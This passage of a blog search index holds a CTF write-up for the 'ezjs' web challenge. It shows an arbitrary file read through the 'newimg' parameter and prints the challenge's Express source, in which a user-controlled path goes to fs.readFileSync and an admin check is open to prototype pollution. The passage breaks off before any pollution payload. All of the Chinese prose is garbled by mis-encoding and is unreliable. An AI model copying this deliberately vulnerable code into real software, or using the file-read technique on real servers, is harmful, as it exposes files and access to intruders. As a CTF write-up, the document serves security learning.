<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>2021å·…å³°æå®¢ä¸€é“é¢˜â€”â€”ezjs</title>
      <link href="article/2021dfjk/"/>
      <url>article/2021dfjk/</url>
      
        <content type="html"><![CDATA[<p>æ·±å…¥å­¦ä¹ ä¸€ä¸‹JavaScriptçš„åŸå‹é“¾æ±¡æŸ“æ¼æ´</p><a id="more"></a><p>æˆ‘æ˜¯å·…å³°fwï¼Œå°±æ‘¸å‡ºæ¥ä¸€é“é¢˜ç›®ï¼Œå¥½å¥½å­¦ä¹ ä¸‹åŸå‹é“¾æ±¡æŸ“ã€‚ä»¥ä¸‹ä¸ºåšé¢˜è§†è§’ã€‚</p><h2 id="Web-ezjs"><a href="#Web-ezjs" class="headerlink" title="Web-ezjs"></a>Web-ezjs</h2><h3 id="ç¬¬ä¸€æ­¥-ä»»æ„æ–‡ä»¶è¯»å–"><a href="#ç¬¬ä¸€æ­¥-ä»»æ„æ–‡ä»¶è¯»å–" class="headerlink" title="ç¬¬ä¸€æ­¥ - ä»»æ„æ–‡ä»¶è¯»å–"></a>ç¬¬ä¸€æ­¥ - ä»»æ„æ–‡ä»¶è¯»å–</h3><p>æ‰“å¼€é¢˜ç›®å‘ç°éå¸¸ç®€æ´çš„ç™»é™†ï¼Œä»¥ä¸ºæ˜¯sqlæ³¨å…¥ï¼Œéšä¾¿è¾“å…¥ä»¥ä¸‹å‘ç°ç›´æ¥è¿›å…¥äº†ã€‚</p><p>ç™»é™†é™åˆ¶usernameå’Œpasswordå¤§äº5ä½</p><img src="/article/2021dfjk/image-20210803151950579.png" class="" title="image-20210803151950579" loading="lazy"><p>å›¾ç‰‡æ˜¾ç¤ºè¿™å—æ˜æ˜¾æœ‰å¼‚å¸¸ï¼Œå¯¹åº”GETè¯·æ±‚çš„newingå‚æ•°</p><img src="/article/2021dfjk/image-20210803142727224.png" class="" title="image-20210803142727224" loading="lazy"><h4 id="å­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–"><a href="#å­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–" class="headerlink" title="å­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–"></a>å­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–</h4><img src="/article/2021dfjk/image-20210803142841282.png" class="" title="image-20210803142841282" loading="lazy"><p>åˆ©ç”¨æ­¤å¤„è¯»å–äº†éƒ¨åˆ†æºç å¦‚ä¸‹</p><p><code>/app/routes/index.js</code></p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> router <span class="token operator">=</span> express<span class="token punctuation">.</span><span class="token function">Router</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> <span class="token punctuation">&#123;</span>body<span class="token punctuation">,</span> validationResult<span class="token punctuation">&#125;</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express-validator'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> crypto <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'crypto'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> validator <span class="token operator">=</span> <span class="token punctuation">[</span>  <span class="token function">body</span><span class="token punctuation">(</span><span class="token string">'*'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token function">body</span><span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">if</span><span class="token punctuation">(</span><span class="token function">body</span><span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exists</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">isLength</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>min<span class="token operator">:</span> <span class="token number">5</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>  <span class="token punctuation">.</span><span class="token function">withMessage</span><span class="token punctuation">(</span><span class="token string">"username is too short"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token function">body</span><span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">if</span><span class="token punctuation">(</span><span class="token function">body</span><span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exists</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">isLength</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>min<span class="token operator">:</span> <span class="token number">5</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>  <span class="token punctuation">.</span><span class="token function">withMessage</span><span class="token punctuation">(</span><span class="token string">"password is too short"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        <span class="token keyword">const</span> errors <span class="token operator">=</span> <span class="token function">validationResult</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>errors<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'msg'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>title<span class="token operator">:</span> <span class="token string">'error'</span><span class="token punctuation">,</span> msg<span class="token operator">:</span> errors<span class="token punctuation">.</span><span class="token function">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>msg<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">;</span>router<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>validator<span class="token punctuation">)</span><span class="token punctuation">;</span>router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>title<span class="token operator">:</span> <span class="token string">"ç™»å½•ç•Œé¢"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">let</span> username <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>username<span class="token punctuation">;</span>  <span class="token keyword">let</span> password <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>password<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>username <span class="token operator">!==</span> <span class="token keyword">undefined</span> <span class="token operator">&amp;&amp;</span> password <span class="token operator">!==</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>username <span class="token operator">==</span> <span class="token string">"admin"</span> <span class="token operator">&amp;&amp;</span> password <span class="token operator">===</span> crypto<span class="token punctuation">.</span><span class="token function">randomBytes</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>username <span class="token operator">=</span> <span class="token string">"admin"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>username <span class="token operator">!=</span> <span class="token string">"admin"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>username <span class="token operator">=</span> username<span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'msg'</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span>title<span class="token operator">:</span> <span class="token string">'error'</span><span class="token punctuation">,</span> msg<span class="token operator">:</span> <span class="token string">'admin password error'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/verify'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'msg'</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span>title<span class="token operator">:</span> <span class="token string">'error'</span><span class="token punctuation">,</span>msg<span class="token operator">:</span> <span class="token string">'plz input your username and password'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/verify'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>username<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>username <span class="token operator">===</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'msg'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>title<span class="token operator">:</span> <span class="token string">'error'</span><span class="token punctuation">,</span> msg<span class="token operator">:</span> <span class="token string">'login first plz'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>username <span class="token operator">===</span> <span class="token string">"admin"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>isadmin <span class="token operator">=</span> <span class="token string">"admin"</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>isadmin <span class="token operator">=</span> <span class="token string">"notadmin"</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'verify'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>title<span class="token operator">:</span> <span class="token string">'success'</span><span class="token punctuation">,</span> msg<span class="token operator">:</span> <span class="token string">'verify success'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/admin'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">//req.session.debug = true;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>username <span class="token operator">!==</span> <span class="token keyword">undefined</span> <span class="token operator">&amp;&amp;</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>isadmin <span class="token operator">!==</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>newimg <span class="token operator">!==</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>img <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>newimg<span class="token punctuation">;</span>    <span class="token keyword">var</span> imgdata <span class="token operator">=</span> fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>img<span class="token operator">?</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>img<span class="token operator">:</span> <span class="token string">"./images/1.png"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> base64data <span class="token operator">=</span> Buffer<span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span>imgdata<span class="token punctuation">,</span> <span class="token string">'binary'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token string">'base64'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> info <span class="token operator">=</span> <span class="token punctuation">&#123;</span>title<span class="token operator">:</span> <span class="token string">'æˆ‘çš„ç©ºé—´'</span><span class="token punctuation">,</span> msg<span class="token operator">:</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>username<span class="token punctuation">,</span> png<span class="token operator">:</span> <span class="token string">"data:image/png;base64,"</span> <span class="token operator">+</span> base64data<span class="token punctuation">,</span> diy<span class="token operator">:</span> <span class="token string">"åå¹´ç£¨ä¸€å‰‘ğŸ˜…v0.0.0(å°šå¤„äºå¼€å‘ç‰ˆ"</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>isadmin <span class="token operator">!==</span> <span class="token string">"notadmin"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>debug <span class="token operator">!==</span> <span class="token keyword">undefined</span> <span class="token operator">&amp;&amp;</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>debug <span class="token operator">!==</span> <span class="token boolean">false</span><span class="token punctuation">)</span> info<span class="token punctuation">.</span>pretty <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>p<span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>diy <span class="token operator">!==</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>diy <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>diy<span class="token punctuation">;</span>      info<span class="token punctuation">.</span>diy <span class="token operator">=</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>diy <span class="token operator">?</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>diy<span class="token operator">:</span> <span class="token string">"å°Šè´µçš„admin"</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'admin'</span><span class="token punctuation">,</span> info<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'admin'</span><span class="token punctuation">,</span> info<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'msg'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>title<span class="token operator">:</span> <span class="token string">'error'</span><span class="token punctuation">,</span> msg<span class="token operator">:</span> <span class="token string">'plz login first'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> router<span class="token punctuation">;</span></code></pre><p>/app/app.js</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> createError <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'http-errors'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> path <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'path'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> cookieParser <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'cookie-parser'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> logger <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'morgan'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> crypto <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'crypto'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> session <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express-session'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> key <span class="token operator">=</span> <span class="token string">'session'</span><span class="token punctuation">;</span><span class="token keyword">var</span> indexRouter <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'./routes/index'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> secrets <span class="token operator">=</span> crypto<span class="token punctuation">.</span><span class="token function">randomBytes</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token function">session</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>  name<span class="token operator">:</span> key<span class="token punctuation">,</span>  secret<span class="token operator">:</span> secrets<span class="token punctuation">,</span>  store<span class="token operator">:</span> <span class="token keyword">new</span> <span class="token class-name">sessionStore</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  saveUninitialized<span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>  resave<span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>  cookie<span class="token operator">:</span> <span class="token punctuation">&#123;</span>    maxAge<span class="token operator">:</span> <span class="token number">100</span> <span class="token operator">*</span> <span class="token number">60</span> <span class="token operator">*</span> <span class="token number">600</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// view engine setup</span>app<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'views'</span><span class="token punctuation">,</span> path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'views'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'view engine'</span><span class="token punctuation">,</span> <span class="token string">'pug'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token function">logger</span><span class="token punctuation">(</span><span class="token string">'dev'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>express<span class="token punctuation">.</span><span class="token function">urlencoded</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> extended<span class="token operator">:</span> <span class="token boolean">false</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token function">cookieParser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>express<span class="token punctuation">.</span><span class="token function">static</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'public'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> indexRouter<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// catch 404 and forward to error handler</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">next</span><span class="token punctuation">(</span><span class="token function">createError</span><span class="token punctuation">(</span><span class="token number">404</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// error handler</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span> req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// set locals, only providing error in development</span>  res<span class="token punctuation">.</span>locals<span class="token punctuation">.</span>message <span class="token operator">=</span> err<span class="token punctuation">.</span>message<span class="token punctuation">;</span>  res<span class="token punctuation">.</span>locals<span class="token punctuation">.</span>error <span class="token operator">=</span> req<span class="token punctuation">.</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'env'</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string">'development'</span> <span class="token operator">?</span> err <span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  <span class="token comment">// render the error page</span>  res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span>err<span class="token punctuation">.</span>status <span class="token operator">||</span> <span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> app<span class="token punctuation">;</span></code></pre><p>æœ¬åœ°å®‰è£…ä¸€ä¸‹ç¯å¢ƒ</p><pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>  <span class="token property">"dependencies"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>    <span class="token property">"cookie-parser"</span><span class="token operator">:</span> <span class="token string">"^1.4.5"</span><span class="token punctuation">,</span>    <span class="token property">"crypto"</span><span class="token operator">:</span> <span class="token string">"^1.0.1"</span><span class="token punctuation">,</span>    <span class="token property">"express"</span><span class="token operator">:</span> <span class="token string">"^4.17.1"</span><span class="token punctuation">,</span>    <span class="token property">"express-session"</span><span class="token operator">:</span> <span class="token string">"^1.17.2"</span><span class="token punctuation">,</span>    <span class="token property">"express-validator"</span><span class="token operator">:</span> <span class="token string">"^6.12.1"</span><span class="token punctuation">,</span>    <span class="token property">"http-errors"</span><span class="token operator">:</span> <span class="token string">"^1.8.0"</span><span class="token punctuation">,</span>    <span class="token property">"morgan"</span><span class="token operator">:</span> <span class="token string">"^1.10.0"</span><span class="token punctuation">,</span>    <span class="token property">"path"</span><span class="token operator">:</span> <span class="token string">"^0.12.7"</span><span class="token punctuation">,</span>    <span class="token property">"request"</span><span class="token operator">:</span> <span class="token string">"^2.88.2"</span><span class="token punctuation">,</span>    <span class="token property">"session-file-store"</span><span class="token operator">:</span> <span class="token string">"^1.5.0"</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><h3 id="ç¬¬äºŒæ­¥-ä»£ç å®¡è®¡"><a href="#ç¬¬äºŒæ­¥-ä»£ç å®¡è®¡" class="headerlink" title="ç¬¬äºŒæ­¥ - ä»£ç å®¡è®¡"></a>ç¬¬äºŒæ­¥ - ä»£ç å®¡è®¡</h3><p>æ ¹æ®æºç å¯ä»¥å‘ç°ï¼Œé¢˜ç›®è¦æ±‚æˆ‘ä»¬ä»¥adminèº«ä»½ç™»é™†ï¼Œä½†æ˜¯adminçš„å¯†ç åˆæ˜¯éšæœºä¸å¯èƒ½ç ´è§£çš„</p><img src="/article/2021dfjk/image-20210803143641462.png" class="" title="image-20210803143641462" loading="lazy"><p>è·Ÿåˆ°<code>/verify</code>è·¯ç”±ï¼Œå¯ä»¥çœ‹åˆ°å¦‚æœ<code>session.username</code>æ˜¯adminå°±å°†<code>isadmin</code>èµ‹å€¼adminï¼Œå¦åˆ™å°±æ˜¯notadmin </p><img src="/article/2021dfjk/image-20210803143743000.png" class="" title="image-20210803143743000" loading="lazy"><p>å†ç»§ç»­è·Ÿè¿›åˆ°<code>/admin</code>è·¯ç”± ï¼Œå‘ç°ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´çš„æºç ã€‚å…³é”®ç‚¹åœ¨äºä¸‹ä¸€æ­¥ï¼Œå¦‚æœ<code>isadmin</code><strong>åªè¦ä¸æ˜¯</strong>notadminå°±ä¼šæ‰§è¡Œä¸€æ®µæ“ä½œï¼Œæ‰€ä»¥æˆ‘ä»¬çš„ä¸‹ä¸€ä¸ªç›®æ ‡å°±æ˜¯ä»¤<code>isadmin</code>å˜ä¸ºénotadmin</p><img src="/article/2021dfjk/image-20210803144118578.png" class="" title="image-20210803144118578" loading="lazy"><p>adminçš„å¯†ç æ¯æ¬¡éƒ½æ˜¯éšæœºçš„ï¼Œæ‰€ä»¥å‡ºé¢˜äººæ ¹æœ¬ä¸æƒ³è®©æˆ‘ä»¬ç™»é™†è·å¾—adminï¼Œä¹Ÿä¸å¯èƒ½ç™»é™†adminã€‚æ‰€ä»¥å¾—å¦æƒ³æ–¹æ³•ï¼Œæˆ‘ä»¬çš„å…³é”®ç‚¹å°±åœ¨äºè®©<code>isadmin</code>ä¸æ˜¯notadminï¼Œè€Œ<code>isadmin</code>åˆæ˜¯åœ¨<code>/verify</code>è·¯ç”±ä¸‹æ‰åˆ›å»ºçš„ï¼Œå¦‚æœæ”¹å˜åŸå‹å¯¹è±¡çš„å†…å®¹è®©<code>isadmin</code>æå‰åˆ›å»ºï¼Œè¿™æ 